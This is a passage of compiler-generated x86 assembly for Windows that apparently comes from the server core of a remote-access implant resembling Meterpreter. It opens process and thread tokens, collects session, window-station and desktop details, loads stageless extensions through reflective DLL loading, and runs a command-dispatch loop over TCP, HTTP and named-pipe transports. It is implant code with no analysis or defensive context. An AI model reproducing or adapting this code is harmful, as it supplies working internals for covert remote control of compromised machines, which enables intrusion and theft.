	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L70
L52:
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC28, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	8(%eax), %eax
	testl	%eax, %eax
	je	L53
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	8(%eax), %eax
	movl	8(%ebp), %edx
	movl	(%edx), %ecx
	movl	-32(%ebp), %edx
	movl	4(%edx), %edx
	movl	%ecx, 4(%esp)
	movl	%edx, (%esp)
	call	*%eax
L53:
	movl	-32(%ebp), %eax
	movl	$_create_transport, 60(%eax)
	movl	-32(%ebp), %eax
	movl	$_remove_transport, 64(%eax)
	movl	-32(%ebp), %eax
	movl	$_config_create, (%eax)
	movl	-28(%ebp), %eax
	movl	4(%eax), %edx
	movl	-32(%ebp), %eax
	movl	%edx, 24(%eax)
	movl	$LC29, (%esp)
	call	_real_dprintf
	call	_register_dispatch_routines
	movl	8(%ebp), %eax
	leal	48(%eax), %edx
	movl	-564(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, 4(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_load_stageless_extensions
	movl	%eax, -40(%ebp)
	movl	$LC30, (%esp)
	call	_real_dprintf
	movl	-40(%ebp), %edx
	movl	8(%ebp), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, %edx
	movl	-32(%ebp), %eax
	movl	%edx, 16(%eax)
	movl	-32(%ebp), %eax
	movl	16(%eax), %eax
	movl	-44(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	8(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-44(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__memcpy_s, %eax
	call	*%eax
	movl	$LC31, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	leal	28(%eax), %edx
	movl	-32(%ebp), %eax
	movl	24(%eax), %eax
	movl	%edx, 12(%esp)
	movl	$1, 8(%esp)
	movl	$983551, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__OpenThreadToken@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	jne	L54
	movl	-32(%ebp), %eax
	leal	28(%eax), %ebx
	movl	__imp__GetCurrentProcess@0, %eax
	call	*%eax
	movl	%ebx, 8(%esp)
	movl	$983551, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__OpenProcessToken@12, %eax
	call	*%eax
	subl	$12, %esp
L54:
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_scheduler_initialize
	testl	%eax, %eax
	je	L55
	movl	$10, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L70
L55:
	movl	-32(%ebp), %eax
	movl	28(%eax), %edx
	movl	-32(%ebp), %eax
	movl	%edx, 32(%eax)
	call	_server_sessionid
	movl	-32(%ebp), %edx
	movl	%eax, 36(%edx)
	movl	-32(%ebp), %eax
	movl	36(%eax), %edx
	movl	-32(%ebp), %eax
	movl	%edx, 40(%eax)
	movl	__imp__GetProcessWindowStation@0, %eax
	call	*%eax
	movl	$0, 16(%esp)
	movl	$256, 12(%esp)
	leal	-304(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$2, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetUserObjectInformationA@20, %eax
	call	*%eax
	subl	$20, %esp
	leal	-304(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___strdup, %eax
	call	*%eax
	movl	-32(%ebp), %edx
	movl	%eax, 44(%edx)
	leal	-304(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___strdup, %eax
	call	*%eax
	movl	-32(%ebp), %edx
	movl	%eax, 48(%edx)
	movl	__imp__GetCurrentThreadId@0, %eax
	call	*%eax
	movl	%eax, (%esp)
	movl	__imp__GetThreadDesktop@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$0, 16(%esp)
	movl	$256, 12(%esp)
	leal	-560(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$2, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetUserObjectInformationA@20, %eax
	call	*%eax
	subl	$20, %esp
	leal	-560(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___strdup, %eax
	call	*%eax
	movl	-32(%ebp), %edx
	movl	%eax, 52(%edx)
	leal	-560(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___strdup, %eax
	call	*%eax
	movl	-32(%ebp), %edx
	movl	%eax, 56(%edx)
	call	_current_unix_timestamp
	movl	-32(%ebp), %edx
	movl	%eax, 76(%edx)
	movl	$LC32, (%esp)
	call	_real_dprintf
	jmp	L56
L67:
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	20(%eax), %eax
	testl	%eax, %eax
	je	L57
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC33, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	20(%eax), %eax
	movl	-32(%ebp), %edx
	movl	4(%edx), %edx
	movl	%edx, (%esp)
	call	*%eax
	testl	%eax, %eax
	je	L57
	movl	$LC34, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %edx
	movl	-32(%ebp), %eax
	movl	%edx, 4(%eax)
	jmp	L56
L57:
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %edx
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC35, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	32(%eax), %eax
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	-32(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -48(%ebp)
	movl	-48(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC36, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	24(%eax), %eax
	testl	%eax, %eax
	je	L58
	movl	$LC37, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	24(%eax), %eax
	movl	-32(%ebp), %edx
	movl	4(%edx), %edx
	movl	%edx, (%esp)
	call	*%eax
L58:
	movl	$LC38, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	16(%eax), %eax
	testl	%eax, %eax
	je	L59
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	16(%eax), %eax
	cmpl	$0, -48(%ebp)
	jne	L60
	movl	-32(%ebp), %edx
	movl	8(%edx), %edx
	testl	%edx, %edx
	jne	L60
	movl	$1, %ecx
	jmp	L61
L60:
	movl	$0, %ecx
L61:
	movl	-32(%ebp), %edx
	movl	4(%edx), %edx
	movl	%ecx, 4(%esp)
	movl	%edx, (%esp)
	call	*%eax
L59:
	cmpl	$0, -48(%ebp)
	jne	L62
	movl	$LC39, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	8(%eax), %eax
	testl	%eax, %eax
	jne	L63
	movl	$LC40, (%esp)
	call	_real_dprintf
	jmp	L64
L63:
	movl	-32(%ebp), %eax
	movl	8(%eax), %edx
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC41, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	8(%eax), %edx
	movl	-32(%ebp), %eax
	movl	%edx, 4(%eax)
	movl	-32(%ebp), %eax
	movl	$0, 8(%eax)
	jmp	L65
L62:
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %edx
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC41, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %edx
	movl	-32(%ebp), %eax
	movl	%edx, 4(%eax)
L65:
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L66
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC42, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	movl	%eax, (%esp)
	call	_sleep
	movl	-32(%ebp), %eax
	movl	$0, 12(%eax)
L66:
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_free_encryption_context
L56:
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	jne	L67
L64:
	jmp	L68
L69:
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, 4(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_remove_transport
L68:
	movl	-32(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	jne	L69
	movl	$LC43, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_deregister_dispatch_routines
L70:
	movl	$LC44, (%esp)
	call	_real_dprintf
	call	_scheduler_destroy
	movl	$LC45, (%esp)
	call	_real_dprintf
	call	_command_join_threads
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_remote_deallocate
	movl	$LC46, (%esp)
	call	_real_dprintf
	movl	-36(%ebp), %eax
	leal	-12(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.lcomm _processIdToSessionId.83553,4,4
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strlen;	.scl	2;	.type	32;	.endef
	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
	.def	_LoadLibraryR@12;	.scl	2;	.type	32;	.endef
	.def	_load_extension;	.scl	2;	.type	32;	.endef
	.def	_stagelessinit_extension;	.scl	2;	.type	32;	.endef
	.def	_wcsncmp;	.scl	2;	.type	32;	.endef
	.def	_transport_create_tcp;	.scl	2;	.type	32;	.endef
	.def	_transport_create_named_pipe;	.scl	2;	.type	32;	.endef
	.def	_transport_create_http;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
	.def	_memcpy;	.scl	2;	.type	32;	.endef
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
	.def	_realloc;	.scl	2;	.type	32;	.endef
	.def	_transport_write_tcp_config;	.scl	2;	.type	32;	.endef
	.def	_transport_write_named_pipe_config;	.scl	2;	.type	32;	.endef
	.def	_transport_write_http_config;	.scl	2;	.type	32;	.endef
	.def	_disable_thread_error_reporting;	.scl	2;	.type	32;	.endef
	.def	_srand;	.scl	2;	.type	32;	.endef
	.def	_thread_open;	.scl	2;	.type	32;	.endef
	.def	_remote_allocate;	.scl	2;	.type	32;	.endef
	.def	_register_dispatch_routines;	.scl	2;	.type	32;	.endef
	.def	_scheduler_initialize;	.scl	2;	.type	32;	.endef
	.def	_sleep;	.scl	2;	.type	32;	.endef
	.def	_free_encryption_context;	.scl	2;	.type	32;	.endef
	.def	_deregister_dispatch_routines;	.scl	2;	.type	32;	.endef
	.def	_scheduler_destroy;	.scl	2;	.type	32;	.endef
	.def	_command_join_threads;	.scl	2;	.type	32;	.endef
	.def	_remote_deallocate;	.scl	2;	.type	32;	.endef
